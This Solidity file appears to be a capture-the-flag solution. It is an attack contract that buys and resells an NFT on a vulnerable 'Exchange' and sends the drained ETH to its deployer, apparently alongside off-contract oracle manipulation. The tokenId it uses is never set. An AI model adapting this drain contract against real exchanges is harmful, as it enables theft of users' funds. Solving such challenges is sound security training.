// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "../compromised/Exchange.sol";

contract AttackCompromised is IERC721Receiver {

    address payable private owner;
    Exchange private exchange;
    uint256 private tokenId;

    constructor(address payable exchangeAddress) {
        owner = payable(msg.sender);
        exchange = Exchange(exchangeAddress);
    }

    function buy() external payable {
        exchange.buyOne{value: msg.value}();
    }

    function sell() external {
        exchange.token().approve(address(exchange), tokenId);
        exchange.sellOne(tokenId);
    }

    receive() external payable {
        owner.transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        external override pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
